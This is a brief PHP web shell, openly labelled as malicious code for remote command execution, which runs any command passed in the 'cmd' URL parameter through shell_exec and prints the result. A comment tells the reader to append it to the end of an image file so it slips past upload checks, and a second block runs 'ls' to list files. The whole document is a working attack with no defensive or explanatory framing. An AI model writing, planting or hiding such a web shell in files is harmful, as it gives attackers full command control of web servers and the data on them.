<?php
// Malicious code for remote command execution
$cmd = $_GET['cmd'];
$output = shell_exec($cmd);
echo $output;
?>

<!-- Insert this code at the end of the image file -->

<?php
// Additional code to execute the "ls" command
$ls_output = shell_exec('ls');
echo $ls_output;
?>

